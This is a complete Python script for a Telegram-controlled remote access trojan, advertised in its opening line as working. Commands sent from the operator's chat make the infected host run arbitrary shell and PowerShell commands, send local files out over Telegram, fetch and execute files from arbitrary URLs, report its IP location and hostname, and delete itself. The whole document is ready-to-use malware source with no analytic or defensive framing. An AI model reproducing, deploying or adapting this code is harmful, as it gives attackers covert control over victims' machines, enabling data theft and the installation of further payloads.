# WORKING !

import telebot
import platform
import subprocess
import os
import requests

BOT_TOKEN = "%replace_with_ur_token%"
GROUP_CHAT_ID = "" # put your private chat id here without ""
bot = telebot.TeleBot(BOT_TOKEN)
HOSTNAME = platform.node()

def execute_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout or result.stderr

@bot.message_handler(func=lambda message: str(message.chat.id) == str(GROUP_CHAT_ID))
def handle_message(message):
    text = message.text.strip()

    if text.startswith('!cmd'):
        command = text[5:]
        if command:
            output = execute_command(command)
            bot.reply_to(message, f"Result of command:\n{output}")
        else:
            bot.reply_to(message, "write command after !cmd")

    elif text.startswith('!shell'):
        command = text[7:]
        if command:
            output = execute_command(f"powershell -Command \"{command}\"")
            bot.reply_to(message, f"Result of powershell command:\n{output}")
        else:
            bot.reply_to(message, "write command after !shell")

    elif text.startswith('!upload'):
        file_path = text[7:].strip()
        if os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file, caption=f"File {file_path}")
        else:
            bot.reply_to(message, "file does not exist.")

    elif text.startswith('!download'):
        file_url = text[10:].strip()
        response = requests.get(file_url)
        if response.status_code == 200:
            file_name = file_url.split('/')[-1]
            with open(file_name, 'wb') as file:
                file.write(response.content)
            output = execute_command(file_name)
            bot.reply_to(message, f"Result of execution of {file_name}:\n{output}")
        else:
            bot.reply_to(message, "Error downloading file.")

    elif text.startswith('!ip'):
        response = requests.get('http://ip-api.com/json')
        if response.status_code == 200:
            data = response.json()
            bot.reply_to(message, f"IP: {data['query']}\nCountry: {data['country']}\nCity: {data['city']}\nTimezone: {data['timezone']}")
        else:
            bot.reply_to(message, "Error get IP informations.")

    elif text.startswith('!kms'):
        os.remove(__file__)
        bot.reply_to(message, "file deleted.")

    elif text == '!check':
        bot.reply_to(message, f"Connected - {HOSTNAME}")

    elif text == '!help':
        help_text = (
            "!cmd <commande> : run commands.\n"
            "!shell <commande> : run shell commands.\n"
            "!upload <chemin_du_fichier> : download file (enter the file path).\n"
            "!download <url_du_fichier> : download file from url and run it.\n"
            "!ip : get ip info of client.\n"
            "!kms : self delete client file.\n"
            "!check : check if the client is connected."
        )
        bot.reply_to(message, help_text)

bot.polling()
